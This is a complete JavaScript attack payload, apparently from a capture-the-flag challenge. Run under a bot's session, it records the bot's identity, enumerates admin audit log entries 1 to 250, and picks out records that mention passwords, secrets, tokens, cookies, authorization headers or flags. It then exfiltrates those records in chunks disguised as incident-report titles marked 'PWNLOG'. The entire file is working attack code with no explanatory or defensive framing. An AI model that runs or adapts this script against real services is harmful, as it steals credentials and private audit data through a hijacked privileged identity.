
(async () => {
    const send = async title => {
        const r = await fetch("/api/incidents", {
            method: "POST",
            credentials: "same-origin",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                title: title.slice(0, 105),
                facility: "Meridian-2",
                severity: "Watch"
            })
        });

        if (!r.ok) throw new Error("Incident write failed");
    };

    const sleep = ms =>
        new Promise(resolve => setTimeout(resolve, ms));

    const stats = {
        success: 0,
        forbidden: 0,
        missing: 0,
        errors: 0
    };

    const hits = [];

    // Confirm the execution identity.
    const me = await fetch("/api/me", {
        credentials: "same-origin"
    }).then(r => r.json());

    console.log("BOT IDENTITY:", me);

    // Inspect early audit records.
    const START = 1;
    const END = 250;

    for (let base = START; base <= END; base += 8) {
        const ids = Array.from(
            {length: Math.min(8, END - base + 1)},
            (_, i) => base + i
        );

        const results = await Promise.all(ids.map(async id => {
            try {
                const r = await fetch(
                    `/api/admin/audit?log=${id}`,
                    {
                        credentials: "same-origin",
                        cache: "no-store"
                    }
                );

                const raw = await r.text();

                if (r.status === 403) {
                    stats.forbidden++;
                    return null;
                }

                if (r.status === 404) {
                    stats.missing++;
                    return null;
                }

                if (r.status !== 200) {
                    stats.errors++;
                    return null;
                }

                stats.success++;

                let data;
                try {
                    data = JSON.parse(raw);
                } catch {
                    data = {raw};
                }

                const entry = data.entry || data;
                const dump = entry.request_dump;

                const interesting =
                    (dump !== null && dump !== undefined) ||
                    /password|passwd|secret|seed|token|CyCTF\{|credential|authorization|cookie/i.test(raw) ||
                    (id >= 185 && id <= 195);

                if (interesting) {
                    return {id, status: r.status, raw};
                }

                return null;

            } catch (e) {
                stats.errors++;
                return null;
            }
        }));

        hits.push(...results.filter(Boolean));

        await sleep(100);
    }

    // Include bot identity in the report.
    const output = JSON.stringify({
        identity: me,
        stats,
        records: hits
    });

    const chunks = output.match(/[\s\S]{1,80}/g) || [];

    for (let i = 0; i < chunks.length; i++) {
        await send(
            `PWNLOG|${i + 1}/${chunks.length}|${chunks[i]}`
        );
    }

    await send(
        "PWNEND|SUCCESS:" + stats.success +
        "|403:" + stats.forbidden +
        "|HITS:" + hits.length
    );

    self.postMessage({
        type: "progress",
        message: "PWNED_AUDIT_INVESTIGATION_COMPLETE"
    });
})();
